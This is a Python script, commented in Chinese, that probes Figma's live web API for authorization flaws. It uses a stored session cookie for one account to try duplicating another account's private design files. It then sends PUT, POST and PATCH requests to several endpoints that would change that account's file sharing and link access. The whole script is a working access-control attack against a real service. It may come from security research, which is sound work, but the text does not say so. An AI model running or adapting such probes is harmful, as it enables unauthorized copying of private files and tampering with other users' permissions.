# -*- coding: utf-8 -*-
"""细节探测1: duplicate 私有文件越权复制 + 分享设置写接口探测 (B→A, 无注入)
"""
import io, json, sys, urllib.error, urllib.parse, urllib.request
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://www.figma.com"
A_DESIGN = "5Gs4PaTz11Hlk2sqVnidBG"
A_MAKE = "5zb5YkoxMa09KpqOyuLcHD"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36"
BC = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')


def call(label, method, path, body=None, extra_hdr=None):
    headers = {"User-Agent": UA, "Accept": "application/json", "Origin": BASE,
               "Referer": BASE + "/", "Cookie": BC}
    if extra_hdr:
        headers.update(extra_hdr)
    data = None
    if body is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(body).encode()
    req = urllib.request.Request(BASE + path, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            raw = r.read().decode(errors='replace')
            print(f"[{label}] HTTP {r.status} {raw[:250]}")
            return r.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f"[{label}] HTTP {e.code} {raw[:250]}")
        return e.code, raw


print("======== 1. duplicate 私有文件 ========")
for k, nm in [(A_DESIGN, "A design"), (A_MAKE, "A make")]:
    call(f"duplicate {nm}", "POST", "/api/files_batch/duplicate",
         {"files": [{"key": k, "folder_id": None}], "duplicate_all_make_files": False})
    call(f"duplicate2 {nm}", "POST", f"/api/files/{k}/duplicate", {})
    call(f"duplicate3 {nm}", "POST", "/api/files_batch",
         {"files": [{"key": k, "duplicate": True}]})

print("\n======== 2. 分享设置写接口 (B 改 A 文件权限) ========")
# 常见形态试探
for p in [f"/api/files/{A_DESIGN}/share_settings", f"/api/files/{A_DESIGN}/link_access",
          f"/api/files/{A_DESIGN}/share", f"/api/files/{A_DESIGN}/permissions"]:
    call(f"PUT {p}", "PUT", p, {"link_access": "view"})
    call(f"POST {p}", "POST", p, {"link_access": "view"})
call(f"PATCH files {A_DESIGN}", "PATCH", f"/api/files/{A_DESIGN}", {"link_access": "view"})
